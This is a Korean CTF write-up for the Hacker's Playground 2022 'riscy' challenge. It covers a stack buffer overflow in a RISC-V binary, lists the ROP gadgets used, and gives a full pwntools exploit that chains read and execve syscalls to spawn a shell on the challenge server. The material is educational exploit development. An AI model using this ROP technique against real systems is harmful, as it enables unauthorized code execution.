---
layout: post
title: "[Hacker's Playground 2022] riscy"
subtitle: Hacker's playground 2022 riscy write-up
author: lcy8047
categories: write-up
banner:
  start_at: 8.5
  opacity: 0.618
  image: "https://ctftime.org/media/cache/78/783b179e1b440387e6f2df0a1673b141.png"
  background: "#000"
  height: "100vh"
  min_height: "38vh"
  heading_style: "font-size: 4.25em; font-weight: bold; text-decoration: underline"
  subheading_style: "color: gold"
tags: sstf riscy rop risc-v
sidebar: []
---

64bit RISC-V 에서 ROP를 하는 문제였다.

```cpp
#define _GNU_SOURCE

#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <err.h>

void start() {
  printf("IOLI Crackme Level 0x00\n");
  printf("Password:");

  char buf[32];
  memset(buf, 0, sizeof(buf));
  read(0, buf, 256);
  
  if (!strcmp(buf, "250382"))
    printf("Password OK :)\n");
  else
    printf("Invalid Password!\n");
}

int main(int argc, char *argv[])
{
  setreuid(geteuid(), geteuid());
  setvbuf(stdout, NULL, _IONBF, 0);
  setvbuf(stdin, NULL, _IONBF, 0);

  start();

  return 0;
}
```

- password가 틀렸다고 바로 강제종료하지 않기 때문에, `strcmp`로 비교하는건 아무의미가 없었다.
- RISC-V의 `assembly`와, 함수 호출규약, `objdump`로 나온 결과에서 필요한 gadget들을 잘 찾는 것이 중요했다.

## 사용한 gadget

- 스택에 있는 데이터를 ra, a0, a1, a2, a7 레지스터에 쓸 수 있어야 해서 `objdump`로 나온 코드에서 정규표현식( ex.    `.*a0.*sp\)` )을 써서 찾았다.

``` text
   49714:   6562                    ld  a0,24(sp)
   49716:   70a2                    ld  ra,40(sp)
   49718:   6145                    addi  sp,sp,48
   4971a:   8082                    ret

   41782:   832a                    mv  t1,a0
   41784:   60a6                    ld  ra,72(sp)
   41786:   6522                    ld  a0,8(sp)
   41788:   65c2                    ld  a1,16(sp)
   4178a:   6662                    ld  a2,24(sp)
   4178c:   7682                    ld  a3,32(sp)
   4178e:   7722                    ld  a4,40(sp)
   41790:   77c2                    ld  a5,48(sp)
   41792:   7862                    ld  a6,56(sp)
   41794:   6886                    ld  a7,64(sp)
   41796:   2546                    fld fa0,80(sp)
   41798:   25e6                    fld fa1,88(sp)
   4179a:   3606                    fld fa2,96(sp)
   4179c:   36a6                    fld fa3,104(sp)
   4179e:   3746                    fld fa4,112(sp)
   417a0:   37e6                    fld fa5,120(sp)
   417a2:   280a                    fld fa6,128(sp)
   417a4:   28aa                    fld fa7,136(sp)
   417a6:   6149                    addi    sp,sp,144
   417a8:   8302                    jr  t1

   25db8:   00000073                ecall
   25dbc:   8082                    ret
```

## 풀이

```python
from pwn import *
import time

context(os='linux', arch='riscv', bits=64)

e = ELF('~/sstf2022/riscy/release/src/target')

r = remote('riscy.sstf.site', 18223)
p = "~/sstf2022/riscy/release/deploy"

#r = process([p+"/qemu-riscv64", "-g", "9000", p+"/target"])

sh = p64(0x6c000)
ecall_ret = p64(0x25db8)
main = p64(0x104ae)
gadget1 = p64(0x49714)
gadget = p64(0x41782)

# set "/bin/sh" in data area by read syscall
dummy = b"A"*(40)
payload  = dummy
payload += gadget1
payload += b"A"*24
payload += ecall_ret# next return addr
payload += b"A"*8
payload += gadget
payload += b"A"*8   # dummy
payload += p64(0)   # a0
payload += sh       # a1
payload += p64(10)  # a2
payload += p64(0)   # a3
payload += p64(0)   # a4
payload += p64(0)   # a5
payload += p64(0)   # a6
payload += p64(63)  # a7 ( syscall - read )
payload += main     # ra
payload += p64(0)   # fa0
payload += p64(0)   # fa1
payload += p64(0)   # fa2
payload += p64(0)   # fa3
payload += p64(0)   # fa4
payload += p64(0)   # fa5
payload += p64(0)   # fa6
payload += p64(0)   # fa7
print( "len : ", len( payload ) )

r.send( payload )
time.sleep(1)

r.send(b"/bin/sh\x00")

# run shell by execve syscall
dummy = b"A"*(40)
payload  = dummy
payload += gadget1
payload += b"A"*24
payload += ecall_ret# next return addr
payload += b"A"*8
payload += gadget
payload += b"A"*8   # dummy
payload += sh       # a0
payload += p64(0)   # a1
payload += p64(0)   # a2
payload += p64(0)   # a3
payload += p64(0)   # a4
payload += p64(0)   # a5
payload += p64(0)   # a6
payload += p64(221) # a7 ( syscall - execve )
payload += main     # ra
payload += p64(0)   # fa0
payload += p64(0)   # fa1
payload += p64(0)   # fa2
payload += p64(0)   # fa3
payload += p64(0)   # fa4
payload += p64(0)   # fa5
payload += p64(0)   # fa6
payload += p64(0)   # fa7
print( "len : ", len( payload ) )

r.send( payload )

r.interactive()
```

## 참고

[Linux kernel system calls table](https://marcin.juszkiewicz.com.pl/download/tables/syscalls.html)

system call table

[RISC-V Instruction Set Specifications - riscv-isa-pages documentation](https://msyksphinz-self.github.io/riscv-isadoc/html/index.html)

RISC-V instruction

[The RISC-V Linux User's Manual](https://www.ocf.berkeley.edu/~qmn/linux/riscv.html)

RISC-V manual

[command-not-found.com - riscv64-linux-gnu-objdump](https://command-not-found.com/riscv64-linux-gnu-objdump)

RISC-V objdump install

[Return-Oriented Programming on RISC-V - Part 1](https://infosecwriteups.com/return-oriented-programming-on-risc-v-part-1-dd9817b52d2b)

RISC-V에서 ROP

[Ports/riscv64](https://en.altlinux.org/Ports/riscv64)
